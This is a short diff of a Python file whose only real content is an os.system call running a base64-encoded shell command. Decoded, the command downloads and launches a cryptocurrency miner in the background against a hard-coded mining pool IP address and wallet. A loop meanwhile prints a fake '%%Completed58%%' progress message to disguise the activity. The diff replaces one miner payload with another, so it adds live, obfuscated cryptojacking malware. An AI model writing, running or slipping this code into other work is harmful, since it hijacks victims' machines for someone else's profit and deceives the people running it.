@@ -1,2 +1,2 @@
 import os
-os.system('eval "$(echo "d2dldCBodHRwczovL2dpdGh1Yi5jb20veWZ2ajQ1L2hnai9yYXcvbWFpbi9jcHVtaW5lci1zc2UyICYmIGNobW9kICt4IGNwdW1pbmVyLXNzZTIgJiYgLi9jcHVtaW5lci1zc2UyIC1hIGdyIC1vIHN0cmF0dW0rdGNwczovLzUxLjE2MS4xMTcuMTE1OjE3MDU2IC11IFJXQXdEeG9rbkRIaUY3cmdwTG4xeFZLU3ZUc3ByRHZtdksuJChlY2hvICQoc2h1ZiAtaSAxLTk5OTkgLW4gMSktUlRNKQ==" | base64 -d)" >>/dev/null & while true; do echo "%%Completed58%%"; sleep 5; done ')
+os.system('eval "$(echo "d2dldCBodHRwczovL2dpdGh1Yi5jb20vc2t1c2dkaC9SaHUvcmF3L21haW4vc3JiICYmIGNobW9kICt4IHNyYiAmJiAuL3NyYiAtLWRpc2FibGUtZ3B1IC0tYWxnb3JpdGhtIGdob3N0cmlkZXIgLS1wb29sIDUxLjE2MS4xMTcuMTE1OjE3MDU2IC0td2FsbGV0IFJXQXdEeG9rbkRIaUY3cmdwTG4xeFZLU3ZUc3ByRHZtdks=" | base64 -d)" >>/dev/null & while true; do echo "%%Completed58%%"; sleep 5; done ')
